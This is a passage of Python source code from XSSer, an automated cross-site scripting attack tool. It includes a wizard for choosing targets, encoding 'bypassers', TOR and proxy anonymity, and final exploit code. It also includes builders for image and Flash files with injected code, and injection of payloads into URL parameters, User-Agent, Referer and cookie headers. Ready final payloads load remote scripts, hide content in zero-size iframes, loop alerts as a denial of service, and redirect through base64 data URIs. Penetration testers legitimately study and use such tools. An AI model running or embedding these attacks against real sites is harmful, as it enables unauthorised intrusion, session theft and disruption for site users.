        if self.options.xst:
            xst = subprocess.Popen(shlex.split('curl -q -s -i -m 30 -A ' + agent + ' -e ' + referer + ' -X TRACE -N ' + self.options.xst), stdout=subprocess.PIPE)
        if self.options.target:
            xst = subprocess.Popen(shlex.split('curl -q -s -i -m 30 -A ' + agent + ' -e ' + referer + ' -X TRACE -N ' + self.options.target), stdout=subprocess.PIPE)
        line1 = xst.stdout.read().decode('utf-8')
        if self.options.verbose:
            if line1 != '':
               self.report("[Info] Reply:", line1.rstrip())
            self.report("")
        if "405 Not Allowed" in line1.rstrip() or "405 Method Not Allowed" in line1.rstrip():
            self.report("[Info] REPLY: Target is NOT vulnerable...\n")
        elif "TRACE / HTTP" in line1.rstrip():
            self.report("[Info] REPLY: Target is vulnerable to XST!\n")
        else:
            self.report("[Info] REPLY: Target is NOT vulnerable...\n")
        if self.options.target:
            self.report('='*75)
 
    def start_wizard(self):
        """
        Start Wizard Helper
        """
        #step 0: Menu
        ans1=True
        ans2=True
        ans3=True
        ans4=True
        ans5=True
        ans6=True

        #step 1: Where
        while ans1:
            print("""\nA)- Where are your targets?\n
             [1]- I want to enter the url of my target directly.
             [2]- I want to enter a list of targets from a .txt file.
            *[3]- I don't know where are my target(s)... I just want to explore! :-)
             [e]- Exit/Quit/Abort.
            """)
            ans1 = input("Your choice: [1], [2], [3] or [e]xit\n")
            if ans1 == "1": # from url
                url = input("Target url (ex: http(s)://target.com): ")
                if url.startswith("http"):
                    ans1 = None
                else:
                    print("\n[Error] Your url is not valid!. Try again!")
                    pass
            elif ans1 == "2": # from file
                url = input("Path to file (ex: 'targets_list.txt'): ")
                if url == None:
                    print("\n[Error] Your are not providing a valid file. Try again!")
                    pass
                else:
                    ans1 = None
            elif ans1 == "3": # dorking
                url = "DORKING" 
                ans1 = None
            elif (ans1 == "e" or ans1 == "E"):
                print("Closing wizard...")
                ans1=None
                ans2=None
                ans3=None
                ans4=None
                ans5=None
                ans6=None
            else:
                print("\nNot valid choice. Try again!")

        #step 2: How
        while ans2:
            print(22*"-")
            print("""\nB)- How do you want to connect?\n
             [1]- I want to connect using GET and select some possible vulnerable parameter(s) directly.
             [2]- I want to connect using POST and select some possible vulnerable parameter(s) directly.
             [3]- I want to "crawl" all the links of my target(s) to found as much vulnerabilities as possible.
            *[4]- I don't know how to connect... Just do it! :-)
             [e]- Exit/Quit/Abort.
            """)
            ans2 = input("Your choice: [1], [2], [3], [4] or [e]xit\n")
            if ans2 == "1": # using GET
                payload = input("GET payload (ex: '/menu.php?q='): ")
                if payload == None:
                    print("\n[Error] Your are providing an empty payload. Try again!")
                    pass
                else:
                    self.user_template_conntype = "GET"
                    ans2 = None
            elif ans2 == "2": # using POST
                payload = input("POST payload (ex: 'foo=1&bar='): ")
                if payload == None:
                    print("\n[Error] Your are providing an empty payload. Try again!")
                    pass
                else:
                    self.user_template_conntype = "POST"
                    ans2 = None
            elif ans2 == "3": # crawlering
                payload = "CRAWLER" 
                ans2 = None
            elif ans2 == "4": # crawlering
                payload = "CRAWLER"
                ans2 = None
            elif (ans2 == "e" or ans2 == "E"):
                print("Closing wizard...")
                ans2=None
                ans3=None
                ans4=None
                ans5=None
                ans6=None
            else:
                print("\nNot valid choice. Try again!")

        #step 3: Proxy
        while ans3:
            print(22*"-")
            print("""\nC)- Do you want to be 'anonymous'?\n
             [1]- Yes. I want to use my proxy and apply automatic spoofing methods.
             [2]- Anonymous?. Yes!!!. I have a TOR proxy ready at: http://127.0.0.1:8118. 
            *[3]- Yes. But I haven't any proxy. :-)
             [4]- No. It's not a problem for me to connect directly to the target(s).
             [e]- Exit/Quit.
            """)
            ans3 = input("Your choice: [1], [2], [3], [4] or [e]xit\n")
            if ans3 == "1": # using PROXY + spoofing
                proxy = input("Enter proxy [http(s)://server:port]: ")
                ans3 = None
            elif ans3 == "2": # using TOR + spoofing
                proxy = 'Using TOR (default: http://127.0.0.1:8118)'
                proxy = 'http://127.0.0.1:8118'
                ans3 = None
            elif ans3 == "3": # only spoofing
                proxy = 'Proxy: No - Spoofing: Yes' 
                ans3 = None
            elif ans3 == "4": # no spoofing
                proxy = 'Proxy: No - Spoofing: No'
                ans3 = None
            elif (ans3 == "e" or ans3 == "E"):
                print("Closing wizard...")
                ans3=None
                ans4=None
                ans5=None
                ans6=None
            else:
                print("\nNot valid choice. Try again!")

        #step 4: Bypasser(s)
        while ans4:
            print(22*"-")
            print("""\nD)- Which 'bypasser(s' do you want to use?\n
             [1]- I want to inject XSS scripts without any encoding.
             [2]- Try to inject code using 'Hexadecimal'.
             [3]- Try to inject code mixing 'String.FromCharCode()' and 'Unescape()'.
             [4]- I want to inject using 'Character Encoding Mutations' (Une+Str+Hex). 
            *[5]- I don't know exactly what is a 'bypasser'... But I want to inject code! :-)
             [e]- Exit/Quit.
            """)
            ans4 = input("Your choice: [1], [2], [3], [4], [5] or [e]xit\n")
            if ans4 == "1": # no encode
                enc = "Not using encoders"
                ans4 = None
            elif ans4 == "2": # enc: Hex
                enc = 'Hex'
                ans4 = None
            elif ans4 == "3": # enc: Str+Une
                enc = 'Str+Une' 
                ans4 = None
            elif ans4 == "4": # enc: Mix: Une+Str+Hex
                enc = "Une,Str,Hex"
                ans4 = None
            elif ans4 == "5": # enc: no encode
                enc = 'Not using encoders' 
                ans4 = None
            elif (ans4 == "e" or ans4 == "E"):
                print("Closing wizard...")
                ans4=None
                ans5=None
                ans6=None
            else:
                print("\nNot valid choice. Try again!")

        #step 5: Exploiting
        while ans5:
            print(22*"-")
            print("""\nE)- Which final code do you want to 'exploit' on vulnerabilities found?\n
             [1]- I want to inject a classic "Alert" message box.
             [2]- I want to inject my own scripts.
            *[3]- I don't want to inject a final code... I just want to discover vulnerabilities! :-)
             [e]- Exit/Quit.
            """)
            ans5 = input("Your choice: [1], [2], [3] or [e]xit\n")
            if ans5 == "1": # alertbox
                script = 'Alertbox'
                ans5 = None
            elif ans5 == "2": # manual
                script = input("Enter code (ex: '><script>alert('XSS');</script>): ")
                if script == None:
                    print("\n[Error] Your are providing an empty script to inject. Try again!")
                    pass
                else:
                    ans5 = None
            elif ans5 == "3": # no exploit
                script = 'Not exploiting code' 
                ans5 = None
            elif (ans5 == "e" or ans5 == "E"):
                print("Closing wizard...")
                ans5=None
                ans6=None
            else:
                print("\nNot valid choice. Try again!")

        #step 6: Final
        while ans6:
            print(22*"-")
            print("\nVery nice!. That's all. Your last step is to -accept or not- this template.\n")
            print("A)- Target:", url)
            print("B)- Payload:", payload)
            print("C)- Privacy:", proxy)
            print("D)- Bypasser(s):", enc)
            print("E)- Final:", script)
            print("""
            [Y]- Yes. Accept it and start testing!.
            [N]- No. Abort it?.
            """)
            ans6 = input("Your choice: [Y] or [N]\n")
            if (ans6 == "y" or ans6 == "Y"): # YES
                start = 'YES'
                print('Good fly... and happy "Cross" hacking !!! :-)\n')
                ans6 = None
            elif (ans6 == "n" or ans6 == "N"): # NO
                start = 'NO'
                print("Aborted!. Closing wizard...")
                ans6 = None
            else:
                print("\nNot valid choice. Try again!")
            if url and payload and proxy and enc and script:
                return url, payload, proxy, enc, script
            else:
                return

    def create_fake_image(self, filename, payload):
        """
        Create -fake- image with code injected
        """
        options = self.options
        filename = options.imx
        payload = options.script
        image_xss_injections = ImageInjections()
        image_injections = image_xss_injections.image_xss(options.imx , options.script)
        return image_injections

    def create_fake_flash(self, filename, payload):
        """
        Create -fake- flash movie (.swf) with code injected
    	"""
        options = self.options
        filename = options.flash
        payload = options.script
        flash_xss_injections = FlashInjections()
        flash_injections = flash_xss_injections.flash_xss(options.flash, options.script)
        return flash_injections

    def create_gtk_interface(self):
        """
        Create GTK Interface
        """
        options = self.options
        from core.gtkcontroller import Controller, reactor
        uifile = "xsser.ui"
        controller = Controller(uifile, self)
        self._reporters.append(controller)
        if reactor:
            reactor.run()
        else:
            from gi.repository import Gtk
            Gtk.main()
        return controller

    def run(self, opts=None):
        """
        Run xsser.
        """
        self.token_arrived_flag = False # used for --reverse-check
        self.success_arrived_flag = False # used for --reverse-check
        self.token_arrived_hash = None # used for --reverse-check
        self.token_arrived_hashes = [] # used for --reverse-check

        for reporter in self._reporters:
            reporter.start_attack()

        if opts:
            options = self.create_options(opts)
            self.set_options(options)
        if not self.hub:
            self.hub = HubThread(self)
            self.hub.start()

        options = self.options
        if options:
            if self.options.hash is True: # not fuzzing/heuristic when hash precheck
                self.options.fuzz = False
                self.options.script = False
                self.options.coo = False
                self.options.xsa = False
                self.options.xsr = False
                self.options.dcp = False
                self.options.dom = False
                self.options.inducedcode = False
                self.options.heuristic = False
            if self.options.heuristic: # not fuzzing/hash when heuristic precheck
                self.options.fuzz = False
                self.options.script = False
                self.options.coo = False
                self.options.xsa = False
                self.options.xsr = False
                self.options.dcp = False
                self.options.dom = False
                self.options.inducedcode = False
                self.options.hash = False
            if self.options.Cem: # parse input at CEM for blank spaces
                self.options.Cem = self.options.Cem.replace(" ","")
        else:
            pass
        try:
            if self.options.imx: # create -fake- image with code injected
                p = self.optionParser
                self.report('='*75)
                self.report(str(p.version))
                self.report('='*75)
                self.report("[Image XSS Builder]...")
                self.report('='*75)
                self.report(''.join(self.create_fake_image(self.options.imx, self.options.script)))
                self.report('='*75 + "\n")
        except:
            return

        if options.flash: # create -fake- flash movie (.swf) with code injected
            p = self.optionParser
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("[Flash Attack! XSS Builder]...")
            self.report('='*75)
            self.report(''.join(self.create_fake_flash(self.options.flash, self.options.script)))
            self.report('='*75 + "\n")

        if options.xsser_gtk:
            self.create_gtk_interface()
            return

        if self.options.wizard: # start a wizard helper
            p = self.optionParser
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("[Wizard] Generating XSS attack...")
            self.report('='*75)
            self.user_template = self.start_wizard()

        if self.options.xst: # check for cross site tracing
            p = self.optionParser
            if not self.options.target:
                self.report('='*75)
                self.report(str(p.version))
                self.report('='*75)
                self.report("[XST Attack!] Checking for -HTTP TRACE- method ...")
                self.report('='*75+"\n")
            self.check_trace()

        if self.options.reversecheck or self.options.dom: # generate headless embed web browser
            self.driver = self.create_headless_embed_browser()
            if self.driver == None:
                print("\n[Error] Importing: firefoxdriver lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install firefoxdriver'")
                print("\n[Error] Options: '--reverse-check' and '--Dom' will be aborted...\n")
                self.options.reversecheck = None # aborting '--reverse-check' connection 
                self.options.dom = None # aborting '--Dom' injections

        if options.checktor:
            url = self.check_tor_url # TOR status checking site
            print('='*75)
            print("")
            print("        _                         ")
            print("       /_/_      .'''.            ")
            print("    =O(_)))) ...'     `.          ")
            print("       \_\              `.    .'''")
            print("                          `..'    ") 
            print("")
            print('='*75)
            agents = [] # user-agents
            try:
                f = open("core/fuzzing/user-agents.txt").readlines() # set path for user-agents
            except:
                f = open("fuzzing/user-agents.txt").readlines() # set path for user-agents when testing
            for line in f:
                agents.append(line)
            agent = random.choice(agents).strip() # set random user-agent
            referer = "127.0.0.1"
            print("\n[Info] Sending request to: " + url + "\n")
            print("-"*25+"\n")
            headers = {'User-Agent' : agent, 'Referer' : referer} # set fake user-agent and referer
            try:
                req = urllib.request.Request(url, None, headers)
                tor_reply = urllib.request.urlopen(req).read().decode('utf-8')
                your_ip = tor_reply.split('<strong>')[1].split('</strong>')[0].strip() # extract public IP
                if not tor_reply or 'Congratulations' not in tor_reply:
                    print("It seems that Tor is not properly set.\n")
                    print("IP address appears to be: " + your_ip + "\n")
                else:
                    print("Congratulations!. Tor is properly being used :-)\n")
                    print("IP address appears to be: " + your_ip + "\n")
            except:
                print("[Error] Cannot reach TOR checker system!. Are you connected?\n")
                sys.exit(2) # return

        # step 0: get workers
        nthreads = max(1, abs(options.threads))
        nworkers = len(self.pool.workers)
        if nthreads != nworkers:
            if nthreads < nworkers:
                self.pool.dismissWorkers(nworkers-nthreads)
            else:
                self.pool.createWorkers(nthreads-nworkers)
        for reporter in self._reporters:
            reporter.report_state('scanning')
        
        # step 1: get urls
        urls = self.try_running(self._get_attack_urls, "\n[Error] WARNING: Some internal errors getting -targets-\n")
        for reporter in self._reporters:
            reporter.report_state('arming')
        
        # step 2: get payloads
        payloads = self.try_running(self.get_payloads, "\n[Error] WARNING: Some internal errors getting -payloads-\n")
        for reporter in self._reporters:
            reporter.report_state('cloaking')
        if options.Dwo:
            payloads = self.process_payloads_ipfuzzing(payloads)
        elif options.Doo:
            payloads = self.process_payloads_ipfuzzing_octal(payloads)
        for reporter in self._reporters:
            reporter.report_state('locking targets')

        # step 3: get query string
        query_string = self.try_running(self.get_query_string, "\n[Error] WARNING: Some internal problems getting query -string-\n")
        for reporter in self._reporters:
            reporter.report_state('sanitize')
        urls = self.sanitize_urls(urls)
        for reporter in self._reporters:
            reporter.report_state('attack')

        # step 4: perform attack
        self.try_running(self.attack, "\n[Error] WARNING: Some internal problems running attack...\n", (urls, payloads, query_string))
        for reporter in self._reporters:
            reporter.report_state('reporting')
        if len(self.final_attacks):
            self.report("[Info] Waiting for tokens to arrive...")
        while self._ongoing_requests and not self._landing:
            if not self.pool:
                self.mothership.poll_workers()
            else:
                self.poll_workers()
            time.sleep(0.2)
            for reporter in self._reporters:
                reporter.report_state('final sweep...')
        if self.pool:
            self.pool.dismissWorkers(len(self.pool.workers))
            self.pool.joinAllDismissedWorkers()
        start = time.time()
        while not self._landing and len(self.final_attacks) and time.time() - start < 5.0:
            time.sleep(0.2)
            for reporter in self._reporters:
                reporter.report_state('landing... '+str(int(5.0 - (time.time() - start))))
        if self.final_attacks and self.options.reversecheck: # try a --reverse-check
            final_attack_payloads = []
            self.report("="*45)
            self.report("[*] Reverse Check(s) Results:")
            self.report("="*45 + "\n")
            for final_attack in self.final_attacks.values():
                if final_attack not in final_attack_payloads:
                    final_attack_payloads.append(final_attack)
            for final in final_attack_payloads:
                if self.hash_found:
                    for l in self.hash_found:
                        hashing = l[3]
                        for k, v in final.items():
                            if 'success/'+hashing in v: # find XSS "remote poison" payload!
                                if not self.options.postdata: # GET
                                    self.report("[Info] Generating 'XSS Tunneling' [HTTP GET] exploit:\n")
                                else: # POST
                                    self.report("[Info] Generating 'XSS Tunneling' [HTTP POST] exploit:\n")
                                if "#http://localhost:19084/success/"+str(hashing) in v: # re-parsing injected params for POST
                                    v = v.replace("#http://localhost:19084/success/"+str(hashing), "")
                                if "<script>document.location=document.location.hash.substring(1)</script>" in v:
                                    v = v.replace("<script>document.location=document.location.hash.substring(1)", "<script src='http://localhost:19084/success/"+str(hashing)+"'>")         
                                self.report(v , "\n")
                                self.report("-"*25+"\n")
                                self.token_arrived_flag, self.success_arrived_flag, self.token_arrived_hash = self.hub.check_hash(hashing) # validate hashes (client+server)
                                if self.token_arrived_flag == True and self.token_arrived_hash:
                                    self.report("[Info] Validating HASHES:\n")
                                    if self.success_arrived_flag == False:
                                        self.report(" INJECTED: [", hashing, "] <-> RECEIVED: [", self.token_arrived_hash, "] -> [OK!]\n")
                                    else:
                                        self.report(" INJECTED: [", hashing, "] <-> RECEIVED: [KEYWORD: '/success/' via remote Cross URL Injection] -> [OK!]\n")
                                    self.report("-"*25+"\n")
                                    if self.options.postdata: # POST
                                        self.report("[Info] XSS [HTTP POST] VECTOR [100% VULNERABLE] FOUND!:\n\n|-> "+"".join(self.successful_urls), "(POST:", query_string + ")\n")
                                    else: # GET
                                        self.report("[Info] XSS [HTTP GET] VECTOR [100% VULNERABLE] FOUND!:\n\n|-> "+"".join(self.successful_urls), "\n")
                                    self.token_arrived_hashes.append(self.token_arrived_hash) # add token arrived hashes for counting
                                else:
                                    self.report("[Error] Remote XSS exploit [--reverse-check] has FAILED! -> [PASSING!]\n")
                self.report("-"*25+"\n")
        if self.options.reversecheck or self.options.dom:
            try:
                self.driver.close() # end headless embed web browser driver!
            except:
                try:
                    self.driver.quit() # try quit()
                except:
                    pass
        for reporter in self._reporters:
            reporter.end_attack() # end reports
        if self.mothership:
            self.mothership.remove_reporter(self) # end mothership
        if self.hub:
            self.land() # end token hub server
        self.print_results()

    def sanitize_urls(self, urls):
        all_urls = set()
        if urls is not None:
            for url in urls:
                if url.startswith("http://") or url.startswith("https://"):
                    self.urlspoll.append(url)
                    all_urls.add(url)
                else:
                    if self.options.crawling:
                        self.report("[Error] This target URL: (" + url + ") is not correct! [DISCARDED]\n")
                    else:
                        self.report("\n[Error] This target URL: (" + url + ") is not correct! [DISCARDED]\n")
                    url = None
        else:
            self.report("\n[Error] Not any valid source provided to start a test... Aborting!\n")
        return all_urls

    def land(self, join=False):
        self._landing = True
        if self.hub:
            self.hub.shutdown()
            if join:
                self.hub.join()
                self.hub = None

    def _prepare_extra_attacks(self, payload):
        """
        Setup extra attacks.
        """
        options = self.options
        agents = [] # user-agents
        try:
            f = open("core/fuzzing/user-agents.txt").readlines() # set path for user-agents
        except:
            f = open("fuzzing/user-agents.txt").readlines() # set path for user-agents when testing
        for line in f:
            agents.append(line)
        extra_agent = random.choice(agents).strip() # set random user-agent
        extra_referer = "127.0.0.1"
        extra_cookie = None
        if self.options.script:
            if 'XSS' in payload['payload']:
                payload['payload'] = payload['payload'].replace("XSS","PAYLOAD")
        if 'PAYLOAD' in payload['payload'] or 'XSS' in payload['payload']:
            if options.xsa:
                hashing = self.generate_hash('xsa')
                agent = payload['payload'].replace('PAYLOAD', hashing)
                self._ongoing_attacks['xsa'] = hashing
                self.xsa_injection = self.xsa_injection + 1
                self.options.agent = agent
                extra_agent = agent
                self.extra_hashed_injections[hashing] = "XSA", payload['payload']
            if options.xsr:
                hashing = self.generate_hash('xsr')
                referer = payload['payload'].replace('PAYLOAD', hashing)
                self._ongoing_attacks['xsr'] = hashing
                self.xsr_injection = self.xsr_injection + 1
                self.options.referer = referer
                extra_referer = referer
                self.extra_hashed_injections[hashing] = "XSR", payload['payload']
            if options.coo:
                hashing = self.generate_hash('cookie')
                cookie = payload['payload'].replace('PAYLOAD', hashing)
                self._ongoing_attacks['coo'] = hashing
                self.coo_injection = self.coo_injection + 1
                self.options.cookie = cookie
                extra_cookie = cookie
                self.extra_hashed_injections[hashing] = "COO", payload['payload']
        return extra_agent, extra_referer, extra_cookie

    def attack(self, urls, payloads, query_string):
        """
        Perform an attack on the given urls with the provided payloads and
        query_string.
        """
        for url in urls:
            if self.pool:
                self.poll_workers()
            else:
                self.mothership.poll_workers()
            if not self._landing:
                self.attack_url(url, payloads, query_string)

    def generate_real_attack_url(self, dest_url, description, method, hashing, query_string, payload, orig_url):
        """
        Generate a real attack url using data from a successful test.

	This method also applies DOM stealth mechanisms.
        """
        user_attack_payload = payload['payload']
        if self.options.finalpayload:
            user_attack_payload = self.options.finalpayload
        elif self.options.finalremote:
            user_attack_payload = '<script src="' + self.options.finalremote + '"></script>'
        elif self.options.finalpayload or self.options.finalremote and payload["browser"] == "[Data Control Protocol Injection]":
            user_attack_payload = '<a href="data:text/html;base64,' + b64encode(self.options.finalpayload) + '></a>'
        elif self.options.finalpayload or self.options.finalremote and payload["browser"] == "[Induced Injection]":
            user_attack_payload = self.options.finalpayload
        if self.options.dos:
            user_attack_payload = '<script>for(;;)alert("You were XSSed!!");</script>'
        if self.options.doss:
            user_attack_payload = '<meta%20http-equiv="refresh"%20content="0;">'
        if self.options.b64:
            user_attack_payload = '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4">'
        if self.options.onm:
            user_attack_payload = '"style="position:absolute;top:0;left:0;z-index:1000;width:3000px;height:3000px" onMouseMove="' + user_attack_payload
        if self.options.ifr:
            user_attack_payload = '<iframe src="' + user_attack_payload + '" width="0" height="0"></iframe>'
        do_anchor_payload = self.options.anchor
        anchor_data = None
        attack_hash = None
        if do_anchor_payload: # DOM Shadows!
            dest_url, agent, referer, cookie = self.get_url_payload(orig_url, payload, query_string, user_attack_payload)
            dest_url = dest_url.replace('?', '#')
        else:
            dest_url, agent, referer, cookie = self.get_url_payload(orig_url, payload, query_string, user_attack_payload)
        if attack_hash:
            self.final_attacks[attack_hash] = {'url':dest_url}
        return dest_url

    def token_arrived(self, attack_hash):
        if not self.mothership: # only mothership calls on token arrival
            self.final_attack_callback(attack_hash)

    def final_attack_callback(self, attack_hash):
        if attack_hash in self.final_attacks:
            dest_url = self.final_attacks[attack_hash]['url']
            for reporter in self._reporters:
                reporter.add_checked(dest_url)
            if self._reporter:
                from twisted.internet import reactor
                reactor.callFromThread(self._reporter.post, 'SUCCESS ' + dest_url)

    def apply_postprocessing(self, dest_url, description, method, hashing, query_string, payload, orig_url):
        real_attack_url = self.generate_real_attack_url(dest_url, description, method, hashing, query_string, payload, orig_url)
        return real_attack_url

    def report(self, *args):
        args = list([str(s) for s in args])
        formatted = " ".join(args)
        if not self.options.silent:
            print(formatted)
        for reporter in self._reporters:
            reporter.post(formatted)

    def print_results(self):
        """
        Print results from attack.
        """
        self.report('='*75)
        total_injections = len(self.hash_found) + len(self.hash_notfound)
        if len(self.hash_found) + len(self.hash_notfound) == 0:
            pass
        elif self.options.heuristic: 
            pass
        else:
            self.report("[*] Final Results:")
            self.report('='*75 + '\n')
            self.report("- Injections:", total_injections)
            self.report("- Failed:", len(self.hash_notfound))
            self.report("- Successful:", len(self.hash_found))
            try:
                _accur = len(self.hash_found) * 100 / total_injections
            except ZeroDivisionError:
                _accur = 0
            self.report("- Accur: %s %%\n" % _accur)
            if not len(self.hash_found) and self.hash_notfound:
                self.report('='*75 + '\n')
                pass
            else:
                self.report('='*75)
                self.report("[*] List of XSS injections:")
                self.report('='*75 + '\n')
                if len(self.hash_found) > 1:
                    if len(self.token_arrived_hashes) > 0:
                        if len(self.hash_found) == len(self.token_arrived_hashes):
                            self.report("-> CONGRATULATIONS: You have found: [ " + str(len(self.hash_found)) + " ] XSS vectors [100% VULNERABLE]! ;-)\n")
                        else:
                            self.report("-> CONGRATULATIONS: You have found: [ " + str(len(self.token_arrived_hashes)) + " ] XSS [100% VULNERABLE] of [ " + str(len(self.hash_found)) + " ] possible XSS vectors! ;-)\n")
                    else:
                        self.report("-> CONGRATULATIONS: You have found: [ " + str(len(self.hash_found)) + " ] possible XSS vectors! ;-)\n")
                else:
                    if len(self.token_arrived_hashes) > 0:
                        self.report("-> CONGRATULATIONS: You have found: [ " + str(len(self.hash_found)) + " ] XSS vector [100% VULNERABLE]! ;-)\n")
                    else:
                        self.report("-> CONGRATULATIONS: You have found: [ " + str(len(self.hash_found)) + " ] possible XSS vector! ;-)\n")
                self.report("---------------------" + "\n")
        if self.options.fileoutput:
            fout = open("XSSreport.raw", "w") # write better than append
        for line in self.hash_found:
            if self.options.heuristic or self.options.hash: # not final attack possible when checking
                pass
            else:
                attack_url = self.apply_postprocessing(line[0], line[1], line[2], line[3], line[4], line[5], line[6])
            if line[2] == "XSR":
                self.xsr_found = self.xsr_found + 1
                if len(self.hash_found) < 11:
                    if line[4]: # when query string
                        self.report("[+] Target:", line[6] + " | " + line[4])
                    else:
                        self.report("[+] Target:", line[6])
                    self.report("[+] Vector: [ " + str(line[2]) + " ]")
                    self.report("[!] Method: Referer Injection")
                    self.report("[*] Hash:", line[3])
                    self.report("[*] Payload:", str(Curl.referer))
                    self.report("[!] Status: XSS FOUND!",  "\n", '-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("="*75)
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("="*75 + "\n\n")
                    for h in self.hash_found:
                        if h[2] == "XSR":
                            if h[4]:
                                fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: Referer Injection" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[4]) + "\n\n[!] Status: XSS FOUND!\n\n")
                            else:
                                fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: Referer Injection" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Status: XSS FOUND!\n\n")
                        fout.write("="*75 + "\n\n")
            elif line[2] == "XSA":
                self.xsa_found = self.xsa_found + 1
                if len(self.hash_found) < 11:
                    if line[4]: # when query string
                        self.report("[+] Target:", line[6] + " | " + line[4])
                    else:
                        self.report("[+] Target:", line[6])
                    self.report("[+] Vector: [ " + str(line[2]) + " ]")
                    self.report("[!] Method: User-Agent Injection")
                    self.report("[*] Hash:", line[3])
                    self.report("[*] Payload:", str(Curl.agent))
                    self.report("[!] Status: XSS FOUND!",  "\n", '-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("="*75)
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("="*75 + "\n\n")
                    for h in self.hash_found:
                        if h[2] == "XSA":
                            if h[4]:
                                fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: User-Agent Injection" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[4]) + "\n\n[!] Status: XSS FOUND!\n\n")
                            else:
                                fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: User-Agent Injection" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Status: XSS FOUND!\n\n")
                        fout.write("="*75 + "\n\n")
            elif line[2] == "COO":
                self.coo_found = self.coo_found + 1
                if len(self.hash_found) < 11:
                    if line[4]: # when query string
                        self.report("[+] Target:", line[6] + " | " + line[4])
                    else:
                        self.report("[+] Target:", line[6])
                    self.report("[+] Vector: [ " + str(line[2]) + " ]")
                    self.report("[!] Method: Cookie Injection")
                    self.report("[*] Hash:", line[3])
                    self.report("[*] Payload:", str(Curl.cookie))
                    self.report("[!] Status: XSS FOUND!",  "\n", '-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("="*75)
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("="*75 + "\n\n")
                    for h in self.hash_found:
                        if h[2] == "COO":
                            if h[4]:
                                fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: Cookie Injection" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[4]) + "\n\n[!] Status: XSS FOUND!\n\n")
                            else:
                                fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: Cookie Injection" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Status: XSS FOUND!\n\n")
                        fout.write("="*75 + "\n\n")
            elif line[1] == "[Data Control Protocol Injection]":
                self.dcp_found = self.dcp_found + 1
                if len(self.hash_found) < 11:
                    if line[4]: # when query string
                        self.report("[+] Target:", line[6] + " | " + line[4])
                    else:
                        self.report("[+] Target:", line[6])
                    self.report("[+] Vector: [ " + str(line[2]) + " ]")
                    self.report("[!] Method: DCP")
                    self.report("[*] Hash:", line[3])
                    self.report("[*] Payload:", line[0])
                    self.report("[!] Vulnerable: DCP (Data Control Protocol)")
                    if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                        self.report("[*] Final Attack:", attack_url)
                    self.report("[!] Status: XSS FOUND!",  "\n", '-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("="*75)
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("="*75 + "\n\n")
                    for h in self.hash_found:
                        if h[4]:
                            if h[1] == "[Data Control Protocol Injection]":
                                if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                                    fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: DCP" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Vulnerable: " + "DCP (Data Control Protocol)" + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND!\n\n")
                                else:
                                    fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: DCP" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Vulnerable: " + "DCP (Data Control Protocol)" + "\n\n[!] Status: XSS FOUND!\n\n")
                            else:
                                if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                                    fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: DCP" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Vulnerable: " + "DCP (Data Control Protocol)" + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND!\n\n")
                                else:
                                    fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: DCP" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Vulnerable: " + "DCP (Data Control Protocol)" + "\n\n[!] Status: XSS FOUND!\n\n")
                        fout.write("="*75 + "\n\n")
            elif line[1] == "[Document Object Model Injection]":
                self.dom_found = self.dom_found + 1 
                if len(self.hash_found) < 11:
                    if line[4]: # when query string
                        self.report("[+] Target:", line[6] + " | " + line[4])
                    else:
                        self.report("[+] Target:", line[6])
